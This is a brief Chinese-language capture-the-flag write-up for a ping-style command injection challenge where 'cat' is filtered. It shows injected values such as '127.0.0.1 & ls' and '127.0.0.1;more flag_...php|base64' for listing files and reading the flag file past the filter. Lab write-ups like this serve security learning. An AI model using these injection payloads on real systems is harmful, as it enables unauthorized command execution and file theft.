![1687099269351](image/过滤cat/1687099269351.png)


```sql
127.0.0.1 & ls
//首先找出文件名
```

![1687098780937](image/过滤cat/1687098780937.png)

```sql
多条显示命令都可以
127.0.0.1;more flag_153131129926766.php|base64
127.0.0.1;less flag_153131129926766.php|base64
//查询flag.php文件里的内容
```

![1687098803976](image/过滤cat/1687098803976.png)

![1687098814155](image/过滤cat/1687098814155.png)

得出base64加密后的内容，使用base64解码工具得出flag
